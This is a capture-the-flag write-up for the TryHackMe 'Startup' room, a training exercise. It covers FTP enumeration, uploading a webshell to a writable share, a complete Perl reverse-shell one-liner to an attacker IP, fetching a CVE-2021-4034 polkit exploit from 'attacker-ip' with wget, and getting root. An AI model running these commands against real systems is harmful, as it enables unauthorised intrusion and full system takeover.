# Startup-CTF-WriteUp

In this write-up, I will provide a detailed analysis of my approach to solving the challenges presented in Startup CTF on TryHackMe (https://tryhackme.com/r/room/startup). This write-up aims to offer insights into the methodologies used, the tools and techniques employed, and the thought processes behind each solution. Whether you are a fellow CTF enthusiast, a cybersecurity professional, or simply someone interested in understanding the intricacies of ethical hacking, I hope you find this documentation both informative and engaging.

Upon obtaining the IP address (e.g., 10.10.7.214), the initial step I take is to conduct an Nmap scan to enumerate the services and open ports on the target host. This provides a comprehensive overview of the services running and helps identify potential entry points for further exploration.

The command that was used is as follows: 

nmap -sC -sV -A -T4 --script=http-enum -oN initial_scan.txt -vv 10.10.7.214

After the scan is finished it could be seen that there are three services running:

FTP Server on port 21 more specifically vsftpd 3.0.3
SSH Server on port 22 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
HTTP Server on port 80 running on Apache httpd 2.4.18 ((Ubuntu))

![Screenshot at 2024-08-08 20-26-06](https://github.com/user-attachments/assets/4c5ed99c-89d5-4aa9-ba4e-3e9744f800ff)

After trying to connect to the ftp server it seems like it allows an anonymous login:
Upon listing the content of the directory, few files could be seen

![Screenshot at 2024-08-08 20-30-53](https://github.com/user-attachments/assets/6cffe78e-9d45-4281-8ad3-b64aa5642ae8)

As illustrated in the image above, the FTP directory is writable by anonymous users. This permission level may prove valuable for further exploitation or data manipulation.

After downloading the files, no significant findings were discovered. Attempts to use Stegcracker on the "important.jpg" image with both the rockyou.txt and rockyouUpdated.txt wordlists yielded no results.

[!!!INFO!!!] Stegcracker is a Steganography brute-force utility to uncover hidden data inside files.
Looking for the Docker repository? You can find it here https://github.com/Paradoxis/StegCracker [!!!INFO!!!]

The content of the notice.txt file is as follows: 

"Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus."

Given the accessibility of the FTP directory from the HTTP server, I decided to upload a webshell to the FTP directory for further exploitation.

![Screenshot at 2024-08-08 20-52-03](https://github.com/user-attachments/assets/223b7500-8449-46af-a276-0251a829fba0)

In order to successfully upload the webshell simply going back to the FTP server through a terminal navigating to the ftp directory and using the "PUT" command followed by the name of the file
achieves the expected results.

After that the web shell can be accessed by navigating to http://10.10.7.214/files/ftp/index.php

![Screenshot at 2024-08-08 20-08-28](https://github.com/user-attachments/assets/cb686284-83ca-42b6-907b-81c10c79f4b4)

The output from running perl --version in the image above demonstrates that system commands can be executed on the victim’s machine via the web shell which can also be seen in the image above.

From here on next thing that has to be done is simply turning this web into a reverse one.

I've decided to use perl for this example.

Before executing the reverse shell command of course a netcat listener is needed.

![Screenshot at 2024-08-08 21-02-15](https://github.com/user-attachments/assets/0e67d87f-fecf-4c88-8a25-32aa500a54d2)

perl -e 'use Socket;$i="10.9.181.114";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

After pasting the above command in the command field in the web shell with of course the appropriate listening ip and port this will achieve a reverse connection from the target's machine back to the attacker.

Initially any connection would be as the www-data user.

Here though I only made the pictures after I rooted the machine.

![Screenshot at 2024-08-08 20-13-52](https://github.com/user-attachments/assets/a1e46243-1e45-4dbf-af05-87a323840847)

Few tricks that I love to use to upgrade a regular shell to be a little bit more comfortable to use are: 

python3 -c 'import pty;pty.spawn("/bin/bash")' - which will turn a non-tty shell into a tty one.

export TERM=xterm which allows us to use the clear command

After initially gaining foothold, you would typically have insufficient privileges to access or read the user.txt file located in /home/<username> in this case /home/lennie.

A common technique I use is to check whether pkexec is running and, if so, determine its version. Specifically, version 0.105 is notable because it often serves as a critical vector for privilege escalation, leveraging one of my preferred CVEs.

Some additional info on the fore-mentioned privilege escalation vulnerability.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034

Actually it comes as a surprise to me that a lot of machines seem to run this version of polkit. (Always update your out of date software).

Pretty much from here on everything is straight-forward.

We navigate to the folder containing the CVE-2021-4034 exploit on the attacker’s machine and set up a Python web server to facilitate the transfer of the exploit to the victim’s machine.

Setting up a python http server is as easy as running python -m http.server in the terminal in the specific directory where the exploit is located.

From there on, on the victim's machine we navigate to /tmp since that's a go to folder for stuff like that as it is a writable directory 

On the victim's machine, we navigate to the /tmp directory, a common location for such tasks due to its writable nature. 

We download the exploit from the attacker's machine onto the victim's computer by using wget

wget http://attacker-ip:8000/CVE-2021-4034.py

Then we run the exploit and boom we're root.

In the image below the two flags could be seen.

![Screenshot at 2024-08-08 21-17-54](https://github.com/user-attachments/assets/dd033d6f-a639-4005-9ebf-19efefe0e12b)


In conclusion, this Capture The Flag (CTF) challenge demonstrated a comprehensive approach to vulnerability exploitation and privilege escalation. From initial reconnaissance and service enumeration to leveraging known vulnerabilities and performing successful privilege escalation, each step highlighted the importance of methodical and strategic thinking in cybersecurity. The experience not only reinforced technical skills but also underscored the critical nature of maintaining robust security practices to mitigate such attacks.




